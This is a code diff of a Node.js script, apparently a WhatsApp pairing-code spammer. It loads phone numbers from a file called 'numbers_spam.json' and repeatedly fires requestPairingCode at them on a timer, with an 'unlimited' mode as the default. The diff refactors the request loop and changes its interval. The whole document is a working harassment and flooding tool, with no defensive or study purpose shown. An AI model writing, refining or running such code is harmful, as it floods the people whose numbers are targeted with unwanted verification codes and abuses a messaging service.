@@ -6,12 +6,11 @@ const path = require('path');
 const { fork } = require('child_process');
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-
 const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
 async function fetchPhoneNumbers() {
     try {
-        const data = await fs.readFile('./numbers_spam.json', 'utf8'); 
+        const data = await fs.readFile('./numbers_spam.json', 'utf8');
         const jsonData = JSON.parse(data);
         return Object.values(jsonData).flat();
     } catch (error) {
@@ -20,14 +19,15 @@ async function fetchPhoneNumbers() {
     }
 }
 
-async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
+async function processRequests(XeonBotInc, xeonCodes) {
+    let phoneNumbers = await fetchPhoneNumbers();
     const promises = phoneNumbers.slice(0, xeonCodes).map((number) => 
         XeonBotInc.requestPairingCode(number).catch(error => {
             console.error('Request error for number:', number, error);
         })
     );
 
-    await Promise.all(promises); 
+    await Promise.allSettled(promises);
 }
 
 async function XeonProject() {
@@ -42,38 +42,26 @@ async function XeonProject() {
     });
 
     try {
-        let phoneNumbers = await fetchPhoneNumbers();
         let xeonCodes;
-
         const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
         const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));
-
         const choice = await Promise.race([choicePromise, timeoutPromise]);
 
         switch (choice) {
-            case '1':
-                xeonCodes = 100;
-                break;
-            case '2':
-                xeonCodes = 1000;
-                break;
+            case '1': xeonCodes = 100; break;
+            case '2': xeonCodes = 1000; break;
             case '3':
-            case '':
-                xeonCodes = Infinity;
-                break;
-            default:
-                xeonCodes = Infinity;
-                break;
+            case '': xeonCodes = Infinity; break;
+            default: xeonCodes = Infinity; break;
         }
 
         const requestInterval = setInterval(async () => {
             try {
-                phoneNumbers = await fetchPhoneNumbers();
-                await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
+                await processRequests(XeonBotInc, xeonCodes);
             } catch (error) {
                 console.error('Error during processing requests:', error);
             }
-        }, 500); // تقليل الفاصل الزمني إلى 500 مللي ثانية
+        }, 2000);
 
         setTimeout(() => {
             clearInterval(requestInterval);
